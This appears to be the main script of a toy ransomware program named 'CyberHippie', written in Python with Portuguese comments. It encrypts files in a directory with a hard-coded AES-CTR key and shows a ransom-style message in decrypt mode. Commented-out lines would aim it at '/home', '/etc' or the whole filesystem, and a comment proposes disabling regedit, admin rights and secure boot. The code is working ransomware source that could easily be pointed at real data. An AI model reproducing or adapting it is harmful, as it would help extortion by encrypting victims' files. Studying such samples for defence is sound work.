#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter 
import argparse
import os
import Discovery
import Crypter

# ------------------------------------
# A senha pode ter os seguintes tamanhos
# 128/192/256 bits
# letras: 16, 24, 32
# ------------------------------------

HARDCODED_KEY = 'mk love not war!'

def get_parser():
    parser = argparse.ArgumentParser(description="Crypter")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', 
                        action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']
    
    if decrypt:
        print('''
              ✽✽✽✽✽✽✽✽✽✽✽✽✽✽
              ~ CyberHippie
              ☮☮☮☮☮☮☮☮☮☮☮☮☮
              
              Seus dados foram criptografados
              Para decriptalos utilize a seguinte senha '{}'
              '''.format(HARDCODED_KEY))
        key = input('Digite a senha> ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
            
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, Counter=ctr)
    
    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt
              
    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    #startDirs = ['/home', '/etc']
    #startDirs = ['/']
    startDirs = [init_path]
    
    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptFn)
              
    # limpa a chave de criptografia da memoria
    for _ in range(100):
        pass
    
    if not decrypt:
        pass
        #apos a decriptação, você pode alterar o wallpaper
        #alterar os icones, desativar o regedit, admin, bios secure boot, etc
              
if __name__ == '__main__':
    main()
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              